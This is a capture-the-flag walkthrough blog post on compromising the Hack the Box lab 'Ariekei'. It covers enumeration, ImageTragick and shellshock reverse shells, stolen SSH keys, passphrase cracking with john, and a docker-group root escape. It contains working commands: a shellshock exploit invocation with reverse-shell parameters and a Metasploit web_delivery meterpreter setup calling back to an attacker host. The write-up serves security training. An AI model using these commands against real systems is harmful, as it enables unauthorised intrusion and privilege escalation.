<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
            <h1 class="post-title entry-title">Hack the Box Challenge: Ariekei Walkthrough</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-box-challenge-ariekei-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2018-07-22T07:10:11+00:00">July 22, 2018</time><time class="updated" datetime="2025-07-05T16:43:53+00:00">July 5, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Today we are going to solve another CTF challenge “Ariekei” which is available online for those who want to increase their skill in penetration testing and black box testing. Ariekei is a retired vulnerable lab presented by <strong>Hack the Box</strong> for making online penetration practices according to your experience level. They have the collection of vulnerable labs as challenges from beginners to Expert level.</span></p>
<p><span style="color: #000000;"><strong>Level</strong>: Expert</span></p>
<h5><span style="color: #000000;">Task: Find user.txt and root.txt file on the victim’s machine.</span></h5>
<p><span style="color: #000000;">Since these labs are online available therefore they have static IP and IP of sense is <strong>10.10.10.65</strong> so let’s begin with nmap port enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -p- 10.10.10.65 --open</pre>
<p><span style="color: #000000;">From the given below image, you can observe we found port 22, 443 and 1022 are open on the target system.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-aFKjF-uO7ec/W1QfTsULbII/AAAAAAAAYdc/v5YwnOHX3O0DHcB3G2HUAMtwWlrASaxwwCEwYBhgL/s1600/1.png"/></span></p>
<p><span style="color: #000000;">As port 443 is running HTTP server we open the target machine’s IP address in our browser, we check the SSL certificate and find 2 domain names: </span><span style="color: #000000;"><strong>calvin.ariekei.htb</strong> and <strong>beehive.ariekei.htb.</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4ylo8k4_gp8/W1QfVnTQOkI/AAAAAAAAYdI/zkFU-qzMY-IgvjlJFezHpzvXZU2_Cqt6gCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">Now when we open the website we get a webpage that has a message on it saying it was maintenance.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Njgs15W0JWY/W1QfXqfs44I/AAAAAAAAYdE/IcY4aro5hNQcF0AYP96tgc8SD1lAeXhhQCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Now we add the two domain names we found in the SSL certificate in the /etc/hosts file for further enumeration.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-FvAkViJoxq8/W1QfbVgpaXI/AAAAAAAAYdQ/JefzRCcnclk62aqmZv6JYUCBzdg1-FGYwCEwYBhgL/s1600/4.png"/></span></p>
<h5><span style="color: #000000;">When we open “<strong>calvin.ariekei.htb” </strong>we get an error message saying the requested URL is not found.</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-tbmlDUAVnm4/W1QfcdGyyQI/AAAAAAAAYdg/QRxRAcrDBkY0VWM3xdrvb29A9mu7Wit9gCEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Now when we open “<strong>beehive.ariekei.htb</strong>” we get the same under maintenance page as we did the first time we opened the target’s IP address in our browser.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-UXJeCZR8WWQ/W1QfchREqBI/AAAAAAAAYdU/Q_b_Iwaq2qoneF_v0R9-cEettWdEy5CcwCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now we use dirb to enumerate the directories running on target nginx server. We also find that using either the IP address or the domain “<strong>beehive.arieki.htb</strong>” gives us identical results.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb https://10.10.10.65/ -w</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-shVmV1AXETo/W1Qfckbid8I/AAAAAAAAYdc/sIJVDk7NjQk9QnSNk4A7hhAAO5sU0KkYACEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">The dirb scan shows that we access the /cgi-bin/stats directory on the target server, so we open the link provided by the dirb scan. We find that it is running some shell script which might be vulnerable to shellshock vulnerability.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-90hSFptOHRo/W1QfdBAjUTI/AAAAAAAAYdc/4y4Fj1tsi4srFpsUKDxVV33ymPGoQlnSQCEwYBhgL/s1600/8.png"/></span></p>
<p><span style="color: #000000;">When we try to exploit this page using shellshock, we get an emoji which persists whenever we try to exploit it. This may mean there is a web application firewall that protects the server from this attack.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-s2UHR_V6OcU/W1QfdCBrAqI/AAAAAAAAYdY/xgcTNpb03gQsSPDGuxUhR8oYW_mJxxz7QCEwYBhgL/s1600/9.1.png"/></span></p>
<p><span style="color: #000000;">Now we use dirb to scan the other domain on the target server as it was showing different pages when we opened it in our browser.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">dirb https://calvin.ariekei.htb/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-XmLoHDuIexQ/W1QfdfpAiuI/AAAAAAAAYdo/NcP-lh4n6BwFVm0fUivDqCqxiA0F_-pRACEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Dirb scan shows us a directory named “upload/”, we open the link and find an upload page.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-YWgykUi3UPc/W1QfTVx_ClI/AAAAAAAAYdQ/UejnblDzMKcR-K0UwyahhtD8MegOLxBCwCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">This page looks like it converts one type of image into another. This application is may be vulnerable to ImageTragick vulnerability. So we create the mvg file to exploit this vulnerability.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-wzB0xM31vQE/W1QfTXsYfKI/AAAAAAAAYdc/ESZkn0Wdq98LLtvWu5gE3YuP_dOXjopqgCEwYBhgL/s1600/12.png"/></span></p>
<p><span style="color: #000000;">Now we upload the file on the server using the image-convert web application page we find in the upload/ directory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-KzvJwJ__wHk/W1QfUKE5e-I/AAAAAAAAYdI/T2Y5EIwfC5Ah1XnTy-CC3j-p6TJ7BVr0wCEwYBhgL/s1600/14.png"/></span></p>
<p><span style="color: #000000;">We setup our listener using netcat, as soon as we upload the file we get our reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-eI-I9_TmWE0/W1QfUWkW8MI/AAAAAAAAYdM/xYjhyulh0xgoGKmnvDzys04chKgE_46aQCEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">We take a look at /proc/1/cgroup and find that we are inside a Docker container.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-tWAmubi-SCg/W1QfUQmXnFI/AAAAAAAAYdY/-cwoepBMTZQEWzo6QWPFT_ChqzFZLrRoQCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">Now we take a look at the mounted files and find a directory called /common.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-9CrrSSPkdWU/W1QfU-vPaYI/AAAAAAAAYdM/OfB75dw2WkMD0VEQpI383hKwEzbDc-20ACEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">We open the “common/” directory and find a secret directory called “.secrets/”. We take a look inside the content of the directory and find files named “bastion_key” and “bastion_key.pub”.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OesYgsk1wJU/W1QfU60iW5I/AAAAAAAAYdM/64uffGDA3CAyxwmG672HQ5rxEbXmIJ7ngCEwYBhgL/s1600/18.png"/></span></p>
<h5><span style="color: #000000;">Then, we open the “bastion_key” file and we find the RSA key.</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Gyb0zw8zrOQ/W1QfU-uLnJI/AAAAAAAAYdI/sioI4rWgNm8KYZCTaycT73uPK3_zT01ywCEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">We copy the file into our system and save it as id_rsa, so that we can use it to log in using ssh.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dB38gD2_Vpc/W1QfVqV0hII/AAAAAAAAYdM/xUPrw-wT9HUiAsxIVx-gz3dja4EfTiM1gCEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">We change the permissions of the key, and log in through ssh as root user using the RSA key.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 600 id_rsa
ssh root@10.10.10.65 -p 1022 -i id_rsa</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-g0bKh9kThfU/W1QfVsrGIrI/AAAAAAAAYdY/Kbzp3jo9IDk6xddlB6DL9VoOAN0W2coQQCEwYBhgL/s1600/21.png"/></span></p>
<p><span style="color: #000000;">Again we check if we are in docker container or not. We check the /proc/1/cgroup file and find that we are still in a docker container.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-7XBWXU-O7wY/W1QfWAthsGI/AAAAAAAAYdY/8HVWtTt1pukSUUvgYX3516y5OEtkip6HACEwYBhgL/s1600/22.png"/></span></p>
<p><span style="color: #000000;">We again go to the “common/” directory, inside /containers/blog-test/ we find a few files and directories. One of the files contained a few bash commands and also root user password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-tFTf3zsnRKU/W1QfWQimNYI/AAAAAAAAYdE/NARG9lPMqAw9mEsqV87Nf25L7Xo1k3tIwCEwYBhgL/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Enumerating the rest of the directories, inside /common/containers/waf-live/ we find the configuration files for the nginx server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-84iuMCFLOCo/W1QfWmKiz1I/AAAAAAAAYdE/UfyEciuyfTM2iaGu3q9kHZZ7Nw2FN9oQQCEwYBhgL/s1600/24.png"/></span></p>
<p><span style="color: #000000;">We look at the “nginx.conf” file and find that <strong>waf-live</strong> is running on port 443 and routing all traffic between the blog-test container and us. We also find that mod security is acting as the web application firewall.</span></p>
<p><span style="color: #000000;">Now during our dirb scan, we found a directory called <strong>/cgi-bin/stats/. </strong>This could be vulnerable to shellshock. But we were unable to exploit it because of the web application firewall. As the waf-live is routing traffic between us and blog-test on port 443 it is possible to exploit the Shellshock vulnerability from inside the server.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/--Rz-NGRZzf4/W1QfWnDce-I/AAAAAAAAYdc/lYOgi7h0fEEl4wNQEVnLpQ6n0fDXsAb3ACEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">We know the target ip to be 172.24.0.2 form the configuration file. We now need to find the IP address to the docker system we are in.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-E0t2dqIItPI/W1QfXM3dspI/AAAAAAAAYdE/BeYNjiW4SfgyW6Ch7TC9Il5gvK4sgVx3gCEwYBhgL/s1600/26.png"/></span></p>
<h5><span style="color: #000000;">Then, we use the shellshock exploit from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://www.exploit-db.com/exploits/34900/">here</a></span>, and we got a reverse shell of the machine.</span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python 34900.py payload=reverse rhost=172.24.0.2 lhost=172.24.0.253 lport=1234 pages=/cgi-bin/stats</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-llwHnSQSnoA/W1QfXdw2_SI/AAAAAAAAYdc/_8SncgoKJ_IzeVmUAEHW3WVb5mdhlDRgQCEwYBhgL/s1600/27.png"/></span></p>
<p><span style="color: #000000;">The shell we got was not stable, so we use the web_delivery module of the Metasploit-framework to get a stable reverse shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">msf &gt; use multi/script/web_delivery
msf exploit(multi/script/web_delivery) &gt; set payload python/meterpreter/reverse_tcp
msf exploit(multi/script/web_delivery) &gt; set lhost 10.10.14.8
msf exploit(multi/script/web_delivery) &gt; set lport 4444
msf exploit(multi/script/web_delivery) &gt; run</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-SpvBDSmNVQA/W1QfXmVhKQI/AAAAAAAAYdU/XjGIoa9umhMwr66W7nv8P-ukdLA4Bk0VACEwYBhgL/s1600/28.png"/></span></p>
<p><span style="color: #000000;">We copy the command that was given in by the web_delivery script and pasted it in our unstable shell and we got our stable reverse shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-sFccnxynukw/W1QfX00ytnI/AAAAAAAAYdE/r3aAaWjBL3gupAwEkSxdHhyeJ8HqKF87gCEwYBhgL/s1600/30.png"/></span></p>
<p><span style="color: #000000;">Now we spawn a TTY shell and use the password we found earlier in the Dockerfile to log in as root.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0LRBejL_Do8/W1QfYM-VWsI/AAAAAAAAYdI/8kj2OBfKojcLZWEAvgr5vT2JtZ0zEg6yACEwYBhgL/s1600/31.png"/></span></p>
<p><span style="color: #000000;">Unfortunately, we are still inside a container app but in this container, inside /home/spanishdancer we find a file called “user.txt”. We take a look at the content of the file and find our first flag.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-Kr_dJBI-f0k/W1QfYUJrgOI/AAAAAAAAYdc/DAUOegNS3LAmjIh4JtALwddJpyYVOgqMACEwYBhgL/s1600/32.png"/></span></p>
<p><span style="color: #000000;">We search for hidden directories and find a directory called “.ssh”. Then, we go inside the directory and find three files authorized_keys, id_rsa and id_rsa.pub.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-pL6W1OhLtbY/W1QfYsQiIsI/AAAAAAAAYdE/ccMdKIQLIbU1mGPpIIKyxFwdjzGyTCJ5gCEwYBhgL/s1600/33.png"/></span></p>
<h5><span style="color: #000000;">Then, we take a look at the content of id_rsa and find the RSA key.</span></h5>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-gQrrhbE1gSc/W1QfYqrZF7I/AAAAAAAAYdM/a0VuE0MgXyIC0fopTh1741sXuTyjyeHlgCEwYBhgL/s1600/34.png"/></span></p>
<p><span style="color: #000000;">We copy the RSA key into our system and save it as key.txt so that we can use this to log in through ssh.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-DsK_BMXC5L4/W1QfYxgYRFI/AAAAAAAAYdI/PWGOOglZ3bsYgZOErVKZCU5WKicYScpAgCEwYBhgL/s1600/35.png"/></span></p>
<p><span style="color: #000000;">When we try to login through ssh using this key, we are asked for a passphrase. So we use john the ripper to crack the passphrase. We use the default wordlist of johntheripper and find the passphrase to be “purple1”.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">ssh2john key.txt &gt; hash_key.txt
john hash_key.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ZI2RjFkZWLs/W1QfZWZi6eI/AAAAAAAAYdc/pZKVqHAL2y4jG4HJgmeH5xMKOfgEetkFwCEwYBhgL/s1600/36.png"/></span></p>
<p><span style="color: #000000;">After we get the passphrase we change the permission of RSA key file and login as user spanishdancer as it was inside the spanishdancer’s home directory.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">chmod 600 key.txt
ssh -i key.txt spanishdancer@10.10.10.65</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-cO3oyzrLKgA/W1QfZ6jU7HI/AAAAAAAAYdM/1tTnhdqa2fEqNn8jzcIcE5P0-s4lMw-nwCEwYBhgL/s1600/37.png"/></span></p>
<p><span style="color: #000000;">Now when we run the id command we find that we are a member of the docker group. Some containers have a dedicated group to allow unprivileged users to manage their containers without having to escalate their privileges.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-KwyDog1SQQA/W1QfaY_GsYI/AAAAAAAAYdY/jfbIWp81km8jXvA8d3wsIoRez30YeIOpwCEwYBhgL/s1600/38.png"/></span></p>
<p><span style="color: #000000;">To exploit this vulnerability, we first need to check the docker images that are available.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">docker images</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-K4lmh1uZ0PA/W1QfaySjT0I/AAAAAAAAYdQ/sjpka36G18EUZEcDfNHzlbbtyK83Qb5EgCEwYBhgL/s1600/39.png"/></span></p>
<p><span style="color: #000000;">We find that the bash image is available to us. So, we use this to create a new image and mount the root/ directory of the host inside a folder called /hack. After we run the docker image we go to /hack/root and find a file called “root.txt”. When we open the file we find our final flag.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">docker run -v /:/hack -i -t bash</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-kPuL_MRjIJA/W1QfcYEpLVI/AAAAAAAAYdk/If-CnlT3RzcCNNfkc4LmfCRBNqNyF2hQwCEwYBhgL/s1600/40.png"/></span></p>
<p><span style="color: #000000;">Thank you for giving your precious time to read this walkthrough. If you want to read more HTB Write-ups. Follow this</span> <strong><a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/">Link.</a></strong> <span style="color: #000000;">Happy Hacking!</span></p>
<p><span style="color: #000000;"><strong>Author</strong>: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact <a style="color: #000000;" href="https://www.linkedin.com/in/sayantan-bera-2098a613b/"><strong>Here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
